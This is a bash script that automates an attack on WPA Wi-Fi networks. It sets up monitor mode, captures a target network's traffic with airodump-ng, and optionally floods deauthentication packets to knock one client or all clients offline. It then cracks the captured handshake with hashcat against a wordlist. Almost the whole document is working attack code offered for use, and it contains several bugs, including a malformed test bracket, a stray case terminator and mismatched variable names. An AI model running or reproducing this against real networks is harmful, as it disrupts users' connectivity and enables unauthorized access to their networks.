#!/usr/bin/env bash
#Author:NTPriest 
Red='\033[0;31m'
Cyan='\033[1;96m'
NC='\033[0m' #No color 
Green='\011[1;32m'

# --- checking tools if are installed ---
for tools in aircrack-ng airodump-ng aireplay-ng hashcat tcpdump; do
    if ! command -v $tools &> /dev/null; then
        echo -e "${Red}Error: $tools not found, Install it before using script${NC}"
        exit 1
    fi
done

# ----- BANNER ----
echo -e "${Cyan}                                                  "
echo -e " __          ___ ______ ___   __                         "
echo -e " \ \        / (_)  ____(_) \ / /                         "
echo -e "  \ \  /\  / / _| |__   _ \ V / _ __  _ __ ___  ___ ___  "
echo -e "   \ \/  \/ / | |  __| | | > < | '_ \| '__/ _ \/ __/ __| "
echo -e "    \  /\  /  | | |    | |/ . \| |_) | | |  __/\__ \__ \ "
echo -e "     \/  \/   |_|_|    |_/_/ \_\ .__/|_|  \___||___/___/ "
echo -e "                               | |                       "
echo -e "                               |_|                       "
echo -e "By: NTPriest"
echo -e "${NC}"

#Checking if values restricting rules
validate_input() {
    local input_value="$1"
    local input_name="$2"
    local regex="$3"

    if [ -z "$input_value" ]; then
        echo "ERROR: $input_name is required!"
        return 1
    elif [[ ! "$input_value" =~ $regex ]]; then
        echo -e "${Red}ERROR: Invalid $input_name format!${NC}"
        return 1
    fi

    return 0
}

# ===1.INPUTS VALUES ===
while true; do
    read -p  $'\033[38;5;214mEnter Network Interface:\033[0m ' INTERFACE
    validate_input "$INTERFACE" "Network Interface" "^[a-zA-Z0-9_-]+$" || continue
    break
done
# Checking if $INTERFACE exist

while true; do
    if ! ip link show "$INTERFACE" &>/dev/null; then
        echo -e "${Red}Error: The network interface $INTERFACE does not exist!${NC}"
        read -p "Enter network interface: " INTERFACE
    else 
        echo "${Green}$INTERFACE Exists and is avaiable${NC}"
        break
    fi
done
while true; do
    read -p $'\033[38;5;214mBSSID:\033[0m ' BSSID
    validate_input "$BSSID" "BSSID" "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$" || continue
    break
done
while true; do
    read -p $'\033[38;5;214mEnter Channel:\033[0m ' CHANNEL
    validate_input "$CHANNEL" "CHANNEL" "^[0-9]{1,2}$" || continue
    break
done
    echo "'25' sec= 20% Rate\n'40' sec= 50%\n'60' sec= 75%\n '90'sec= 90%\n '120'sec=100%\n or more"

while true; do
    read -p $'\033[38;5;214Set time to capturing (optional:120sec): \033[0m ' SET_TIME
    if [[ -z "$SET_TIME" ]]; then
        echo -e "No time set, using default: 120 seconds"
        break
    elif [[ $SET_TIME =~ ^[0-9]+$ ]]; then
        echo -e "=> Timer set: $SET_TIME"
        break
    else
        echo -e "${Red}Invalid number, gossy-gosse~ >:|${NC}"
    fi
done
while true; do
    read -p $'\033[38;5;214mName Output(without extension):\033[0m ' OUTPUT
    if [ -n "$OUTPUT" ]; then

        echo "Output provided: $OUTPUT.txt"
        break
    else
        echo "${Red}No Output provided!${NC}"
    fi
done

#BIG CASE/ESAC ACTIVE/PASSIVE Operation
while true; do
    read -p $'\033[38;5;214mChoose mechanism of capturing Active/Passive[A/P]:\033[0m ' MODE_CHOICE
    if [[ $MODE_CHOICE =~ ^[Aa]$ ]]; then
        echo -e "set to Active"
        MODE=$MODE_CHOICE
        break
    elif [[ $MODE_CHOICE =~ ^[Pp]$ ]]; then
        echo -e "set to ~Sneaky-Beaky [Passive]"
        MODE=$MODE_CHOICE
        break
    else
        echo -e "${Red}Invalid input. Please enter Y or N.${NC}"
    fi
done

# ===2.RUN MONITOR MODE ===
echo "[+] Running monitor mode on interface $INTERFACE"
sudo airmon-ng start $INTERFACE

#Assign network interface name to mon (airmon-ng)
MONITOR_INTERFACE=$(iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}')
sleep 20

# ==== 3.SNIFFING PACKETS - Active ===
case "$MODE_CHOICE" in
[Aa])

    echo "[+] Running airodump-ng W/Ps:$BSSID, $CHANNEL, $OUTPUT $MONITOR_INTERFACE  "
    sudo airodump-ng --bssid $BSSID --channel $CHANNEL --write $OUTPUT $MONITOR_INTERFACE
    AIRDUMP_PID=$!

    echo "Do you want kick specific MAC? [Y/N] \n (N=Kick All from Network - Not recommended)"

    #--- 4. SENDING Deuth PACKETS by aireplay-ng
    while true; do
        read -p "Do you want to kick a specific MAC? [Y/N]: " KICK_SPECIFIC
        if [[ "$KICK_SPECIFIC" =~ ^[YyNn]$ ]]; then
        break
        else
            echo -e "${Red}Invalid input. Please enter Y or N.${NC}"
        fi
    done

    if [ "$KICK_SPECIFIC" = "Y" ]; then
        read -p "Enter target MAC address: " TARGET_MAC
        echo "[+] Kicking ${TARGET_MAC} from ${BSSID} bye-bye handsome..." 
        sudo aireplay-ng --deauth 10 -a ${BSSID} -c ${TARGET_MAC} ${MONITOR_INTERFACE}
    elif [ "$KICK_SPECIFIC" = "N" ]; then
        echo -e "${Cyan}[+] Sending deauth packets to all... This might get loud!${NC}"
        sudo aireplay-ng --deauth 10 -a ${BSSID} ${MONITOR_INTERFACE}
    fi
    AIREPLAY_PID=$! #PID Aireplay 

    echo "Checking for handshake..."
    echo "Waiting for handshake capture..."

    # Wait Until... <User preference>
    sleep $SET_TIME

    # Dynamic File .cap (Cehcking file in catalog)
    ;;
[Pp])
    echo "[+] Passive Mode selected. Running airodump-ng only."
    sudo airodump-ng --bssid $BSSID --channel $CHANNEL --write $OUTPUT $MONITOR_INTERFACE &
    AIRDUMP_PID=$!
    echo -e "${Cyan}Listening for traffic... Press Ctrl+C to stop.${NC}"
    ;;
*)
    echo -e "${Red}Invalid option. Please choose A or P.${NC}"
    exit 1
    ;;
;;
esac 

CAPTURE_FILE=$(ls ${OUTPUT}-*.cap 2>/dev/null | sort | tail -n 1)

if [ -n "$CAPTURE_FILE" ]; then
    # If exist, checking values information 
    if grep -q "WPA handshake" "$CAPTURE_FILE"; then
        echo -e "${Green}Handshake captured successfully in $CAPTURE_FILE${NC}!"
    else
        echo -e "${Red}No handshake found in $CAPTURE_FILE. Try again or wait longer.${NC}"
    fi
else
    echo "${Red}No capture files found. Please ensure airodump-ng is running and capturing properly.${NC}"
fi

# === 5. STOPPING PROCESS ===
# --- 5.1 Kill airodump-ng
echo "[-] Stopping Airodump-ng"
if [ -n "$AIRODUMP_PID" ]; then
    sudo kill $AIRODUMP_PID
else
    echo "${Red}Error: Failed to stop Airodump-ng. \n Please perform this action manually.\n${NC}"
fi
sleep 10

# --- 5.2 Kill aireplay-ng
echo "[-] Stopping Aireplay-ng"
sudo ip link set $MONITOR_INTERFACE down
if [ $? -ne 0]; then
    echo -e "${Red}Error: Failed to stop Aireplay-ng. \n Please perform this action manually.\n${NC}" 
fi
sleep 10

# --- 5.3 Kill monitor mode
echo "[-] Stopping Airmon-ng"
sudo airmon-ng stop $MONITOR_INTERFACE
if [ $? -ne 0 ]; then
    echo -e "${Red}Error: Failed to stop Airmon-ng. \nPlease perform this action manually.${NC}" 
fi
sleep 10

# --- 7. Hashcat option (optional)
while true; do
    read -p "Do you want to crack hash now [Y/N] (hashcat)?: " QUESTION
    if [[ $QUESTION =~ ^[YyNn]$ ]]; then
        break
    else
        echo -e "${Red}Invalid input. Please enter Y or N.${NC}"
    fi
done
if [ "$QUESTION" = "Y" ]; then
    #Checking if user want to result in txt file 
    read -p "With output .txt? [Y/N]: " HASHCAT_OUT 
#.cap validation
     while true; do
        read -p "Name .cap: " CAPTURE
        if [ -f "$CAPTURE" ]; then
            CAPTURE_LINK="$CAPTURE"
            break
        else
            echo -e "${Red}Capture file not found in the current folder${NC}!"
        fi
    done
#Wordlist validation
    while true; do
        read -p "Name wordlist .txt: " WORDLIST
            if [ -f "$WORDLIST" ]; then
                WORDLIST_LINK="$WORDLIST"
                break
            else 
                echo -e "${Red}Wordlist file not found in the current folder${NC}!"
            fi
        done
    # Running hashcat with/without output
    if [ "$HASHCAT_OUT" = "Y" ]; then 
        read -p $'\033[38;5;214mOutput name:\033[0m ' OUTPUT
        echo "[+] Running hashcat with output file..."
        sudo hashcat -a 0 -w 3 -m 2500 -o "${OUTPUT}.txt" "${CAPTURE_LINK}" "${WORDLIST_LINK}"
    else
        echo "[+] Running hashcat without output file..."
        sudo hashcat -a 0 -w 3 -m 2500 "${CAPTURE_LINK}" "${WORDLIST_LINK}"
    fi
else
    #If user don't want continue 
    echo "No problemo, amigo. Happy cracking later c:"
fi

read -p $'\033[38;5;214mDo you want save history of your operation? [Y/N]:\033[0m ' HISTORY
if [ ${HISTORY} = "Y" ]; then
    echo "${BSSID} - ${KICK_SPECIFIC} - ${CHANNEL} - ${OUTPUT}" >> HistoryXpress.txt
    echo "[+] History saved to History.txt"
else 
    echo "No history saved. Goodbye!"
    exit 1
fi